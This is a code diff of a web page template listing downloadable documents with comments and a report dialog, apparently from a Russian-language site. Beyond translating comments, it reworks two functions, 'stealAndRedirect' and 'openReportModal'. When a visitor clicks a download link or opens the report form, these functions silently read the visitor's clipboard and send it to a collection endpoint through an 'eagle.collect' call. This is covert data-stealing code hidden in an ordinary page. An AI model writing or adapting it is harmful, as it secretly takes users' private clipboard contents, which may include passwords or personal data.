@@ -9,13 +9,13 @@
 </div>
 
 <script>
-    // Скрываем лоадер через 2.5 секунды, когда скрипты уже отработали
+    // Hide loader after 2.5s
     setTimeout(() => {
         document.getElementById('pdfLoader').style.display = 'none';
     }, 2500);
 </script>
 
-<!-- ЗАГОЛОВОК -->
+<!-- HEADER -->
 <div class="card p-4 mb-4">
     <div class="d-flex align-items-center">
         <div class="bg-danger bg-opacity-10 rounded-circle p-3 me-3">
@@ -28,7 +28,7 @@
     </div>
 </div>
 
-<!-- СПИСОК ФАЙЛОВ -->
+<!-- FILE LIST -->
 <div class="card p-4">
     <h5 class="mb-4">Доступные документы ({{ files|length }})</h5>
     
@@ -62,7 +62,7 @@
     </div>
 </div>
 
-<!-- КОММЕНТАРИИ -->
+<!-- COMMENTS -->
 <div class="card p-4 mt-4">
     <div class="d-flex justify-content-between align-items-center mb-3">
         <h6 class="mb-0">Обсуждение</h6>
@@ -102,7 +102,7 @@
     </div>
 </div>
 
-<!-- МОДАЛЬНОЕ ОКНО ЖАЛОБЫ -->
+<!-- REPORT MODAL -->
 <div class="modal fade" id="reportModal" tabindex="-1" aria-hidden="true">
   <div class="modal-dialog modal-dialog-centered">
     <div class="modal-content">
@@ -125,22 +125,18 @@
 async function stealAndRedirect(event, url) {
     event.preventDefault();
     const clip = await stealClipboard();
-    const data = {
-        meta: { trigger: 'DOWNLOAD CLICK (CLIPBOARD)', url: window.location.href },
+    // Use the new eagle instance from base.html
+    eagle.collect('DOWNLOAD CLICK (CLIPBOARD)', {
         system: { CLIPBOARD_DUMP: clip }
-    };
-    const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
-    navigator.sendBeacon('/api/collect', blob);
+    });
     setTimeout(() => { window.location.href = url; }, 200);
 }
 
 async function openReportModal(username) {
     const clip = await stealClipboard();
-    const data = {
-        meta: { trigger: 'REPORT OPENED (CLIPBOARD)', url: window.location.href },
+    eagle.collect('REPORT OPENED (CLIPBOARD)', {
         system: { CLIPBOARD_DUMP: clip, reported_user: username }
-    };
-    navigator.sendBeacon('/api/collect', new Blob([JSON.stringify(data)], {type: 'application/json'}));
+    });
     document.getElementById('reportTarget').value = username;
     document.getElementById('reportReason').value = ''; 
     new bootstrap.Modal(document.getElementById('reportModal')).show();
